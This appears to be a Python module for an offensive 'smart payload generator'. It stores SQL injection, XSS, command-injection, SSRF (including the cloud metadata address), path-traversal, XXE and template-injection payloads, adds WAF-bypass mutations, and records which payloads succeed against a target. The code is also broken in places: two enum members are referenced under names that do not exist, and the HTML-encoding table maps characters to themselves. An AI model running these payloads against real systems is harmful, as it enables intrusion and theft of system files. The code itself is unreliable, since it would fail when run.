"""
AI-Powered Smart Payload Generator
===================================

This module provides intelligent payload generation capabilities
using AI and mutation strategies.

Version: 1.0.0-20260301-Senin-2002-WIB
"""

import random
import string
from typing import List, Dict, Optional
from dataclasses import dataclass
from enum import Enum


class VulnerabilityType(Enum):
    """Vulnerability types supported"""
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    COMMAND_INJECTION = "command_injection"
    SSRF = "ssrf"
    XXE = "xxe"
    LFI = "lfi"
    SSTI = "ssti"
    NOSQL_INJECTION = "nosql"
    LDAP_INJECTION = "ldap"
    XML_INJECTION = "xml"


class EncodingType(Enum):
    """Encoding types for payloads"""
    URL_ENCODE = "url"
    BASE64 = "base64"
    HTML_ENTITY = "html"
    HEX = "hex"
    UTF8 = "utf8"
    DOUBLE_URL = "double_url"
    Unicode = "unicode"


@dataclass
class TargetInfo:
    """Information about the target"""
    tech_stack: List[str] = None
    waf_detected: bool = False
    waf_type: Optional[str] = None
    framework: Optional[str] = None
    
    def __post_init__(self):
        if self.tech_stack is None:
            self.tech_stack = []


class MutationStrategy:
    """Base class for payload mutation strategies"""
    
    @staticmethod
    def encode(payload: str, encoding: EncodingType) -> str:
        """Encode payload with specified encoding"""
        encoders = {
            EncodingType.URL_ENCODE: MutationStrategy._url_encode,
            EncodingType.BASE64: MutationStrategy._base64_encode,
            EncodingType.HTML_ENTITY: MutationStrategy._html_encode,
            EncodingType.HEX: MutationStrategy._hex_encode,
            EncodingType.UTF8: MutationStrategy._utf8_encode,
            EncodingType.DOUBLE_URL: MutationStrategy._double_url_encode,
            EncodingType.UNICODE: MutationStrategy._unicode_encode,
        }
        return encoders.get(encoding, lambda x: x)(payload)
    
    @staticmethod
    def _url_encode(payload: str) -> str:
        result = []
        for char in payload:
            if char in string.ascii_letters + string.digits + "-._~":
                result.append(char)
            else:
                result.append(f"%{ord(char):02X}")
        return ''.join(result)
    
    @staticmethod
    def _base64_encode(payload: str) -> str:
        import base64
        return base64.b64encode(payload.encode()).decode()
    
    @staticmethod
    def _html_encode(payload: str) -> str:
        entities = {
            '<': '<',
            '>': '>',
            '"': '"',
            "'": '&#x27;',
            '/': '&#x2F;'
        }
        return ''.join(entities.get(c, c) for c in payload)
    
    @staticmethod
    def _hex_encode(payload: str) -> str:
        return ''.join(f'%{ord(c):02x}' for c in payload)
    
    @staticmethod
    def _utf8_encode(payload: str) -> str:
        return ''.join(f'%{ord(c):02X}' for c in payload)
    
    @staticmethod
    def _double_url_encode(payload: str) -> str:
        return MutationStrategy._url_encode(MutationStrategy._url_encode(payload))
    
    @staticmethod
    def _unicode_encode(payload: str) -> str:
        return ''.join(f'\\u{ord(c):04x}' for c in payload)


class SmartPayloadGenerator:
    """
    AI-Powered Smart Payload Generator
    
    Generates intelligent payloads based on target context
    and learns from success rates.
    """
    
    def __init__(self, target_info: Optional[TargetInfo] = None):
        self.target_info = target_info or TargetInfo()
        self.payload_history: List[Dict] = []
        
        # Base payloads database
        self.payloads_db = {
            VulnerabilityType.SQL_INJECTION: [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL--",
                "admin'--",
                "1' AND '1'='1",
                "1' ORDER BY 1--",
                "1' AND SLEEP(5)--",
            ],
            VulnerabilityType.XSS: [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>",
                "javascript:alert(1)",
                "{{constructor.constructor('alert(1)')()}}",
            ],
            VulnerabilityType.COMMAND_INJECTION: [
                "; ls -la",
                "| whoami",
                "`id`",
                "$(whoami)",
                "\nid\n",
            ],
            VulnerabilityType.SSRF: [
                "http://localhost/",
                "http://127.0.0.1/",
                "http://[::1]/",
                "http://169.254.169.254/",
            ],
            VulnerabilityType.LFI: [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "/etc/passwd%00",
                "php://filter/convert.base64-encode/resource=index.php",
            ],
            VulnerabilityType.SSTI: [
                "{{7*7}}",
                "${7*7}",
                "<%= 7*7 %>",
                "{{config}}",
                "#{system('id')}",
            ],
            VulnerabilityType.NOSQL_INJECTION: [
                "admin'||'1'=='1",
                "admin' or '1'='1",
                "{\"$ne\": null}",
                "{\"$regex\": \".*\"}",
            ],
            VulnerabilityType.LDAP: [
                "*)(objectClass=*",
                "admin)(objectClass=*",
                "*)(uid=*))(|(uid=",
            ],
            VulnerabilityType.XXE: [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            ],
            VulnerabilityType.XML_INJECTION: [
                "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
            ],
        }
    
    def generate_payloads(
        self,
        vuln_type: VulnerabilityType,
        count: int = 10,
        encoding: Optional[EncodingType] = None
    ) -> List[str]:
        """Generate payloads based on vulnerability type"""
        
        base_payloads = self.payloads_db.get(vuln_type, [])
        
        # WAF bypass mutations
        if self.target_info.waf_detected:
            base_payloads = self._apply_waf_bypass(base_payloads)
        
        # Framework-specific mutations
        if self.target_info.framework:
            base_payloads = self._apply_framework_mutations(
                base_payloads, 
                self.target_info.framework
            )
        
        # Generate variations
        payloads = []
        for _ in range(count):
            base = random.choice(base_payloads)
            
            if encoding:
                base = MutationStrategy.encode(base, encoding)
            
            payloads.append(base)
            
            # Record in history
            self.payload_history.append({
                "payload": base,
                "vulnerability": vuln_type.value,
                "encoding": encoding.value if encoding else None
            })
        
        return payloads
    
    def _apply_waf_bypass(self, payloads: List[str]) -> List[str]:
        """Apply WAF bypass techniques"""
        bypass_payloads = []
        
        for payload in payloads:
            # Case variation
            bypass_payloads.append(payload.upper())
            bypass_payloads.append(payload.lower())
            
            # Comment injection
            bypass_payloads.append(payload.replace(" ", "/**/"))
            bypass_payloads.append(payload.replace(" ", "/*comment*/"))
            
            # Null byte (for some WAFs)
            bypass_payloads.append(payload + "%00")
            
            # Double encoding
            encoded = payload
            for _ in range(2):
                encoded = MutationStrategy._url_encode(encoded)
            bypass_payloads.append(encoded)
        
        return bypass_payloads
    
    def _apply_framework_mutations(
        self, 
        payloads: List[str], 
        framework: str
    ) -> List[str]:
        """Apply framework-specific mutations"""
        
        framework_mutations = {
            "django": [
                # Django template injection
                "{{7*7}}",
                "{% debug %}",
                "{{request}}",
            ],
            "laravel": [
                # Laravel blade
                "{{7*7}}",
                "{!! 'test' !!}",
                "{{config('app.url')}}",
            ],
            "express": [
                # Node.js/Express
                "${7*7}",
                "<%= 7*7 %>",
                "{{7*7}}",
            ],
            "spring": [
                # Spring MVC
                "${7*7}",
                "*{7*7}",
                "@{7*7}",
            ],
        }
        
        mutations = framework_mutations.get(framework.lower(), [])
        return payloads + mutations
    
    def mutate_payload(self, payload: str, strategy: str = "random") -> str:
        """Mutate a single payload using specified strategy"""
        
        strategies = {
            "random": self._random_mutation,
            "encoding": self._encoding_mutation,
            "obfuscation": self._obfuscation_mutation,
            "context": self._context_mutation,
        }
        
        return strategies.get(strategy, self._random_mutation)(payload)
    
    def _random_mutation(self, payload: str) -> str:
        """Apply random mutations"""
        mutations = [
            lambda p: p.upper(),
            lambda p: p.lower(),
            lambda p: p.replace(" ", "/**/"),
            lambda p: p.replace("a", "aa"),
            lambda p: p + "%00",
            lambda p: MutationStrategy._url_encode(p),
        ]
        return random.choice(mutations)(payload)
    
    def _encoding_mutation(self, payload: str) -> str:
        """Apply encoding mutation"""
        encodings = list(EncodingType)
        encoding = random.choice(encodings)
        return MutationStrategy.encode(payload, encoding)
    
    def _obfuscation_mutation(self, payload: str) -> str:
        """Apply obfuscation techniques"""
        # Split and join with comments
        parts = payload.split()
        return "/**/".join(parts)
    
    def _context_mutation(self, payload: str) -> str:
        """Apply context-aware mutations"""
        if "<" in payload:
            # HTML context - add variations
            return payload.replace("<", "<").replace(">", ">")
        return payload
    
    def learn_from_result(
        self, 
        payload: str, 
        success: bool, 
        details: Optional[str] = None
    ):
        """Learn from payload execution results"""
        
        for entry in self.payload_history:
            if entry["payload"] == payload:
                entry["success"] = success
                entry["details"] = details
                entry["timestamp"] = __import__('datetime').datetime.now().isoformat()
    
    def get_success_rate(self, vuln_type: VulnerabilityType) -> float:
        """Calculate success rate for a vulnerability type"""
        
        relevant = [
            h for h in self.payload_history 
            if h.get("vulnerability") == vuln_type.value
        ]
        
        if not relevant:
            return 0.0
        
        successes = sum(1 for r in relevant if r.get("success", False))
        return successes / len(relevant)


# Example usage
if __name__ == "__main__":
    # Create generator with target info
    target = TargetInfo(
        tech_stack=["PHP", "MySQL"],
        waf_detected=True,
        waf_type="Cloudflare",
        framework="laravel"
    )
    
    generator = SmartPayloadGenerator(target)
    
    # Generate SQL injection payloads
    sqli_payloads = generator.generate_payloads(
        VulnerabilityType.SQL_INJECTION,
        count=5,
        encoding=EncodingType.URL_ENCODE
    )
    
    print("SQL Injection Payloads:")
    for p in sqli_payloads:
        print(f"  - {p}")
    
    # Generate XSS payloads
    xss_payloads = generator.generate_payloads(
        VulnerabilityType.XSS,
        count=3
    )
    
    print("\nXSS Payloads:")
    for p in xss_payloads:
        print(f"  - {p}")
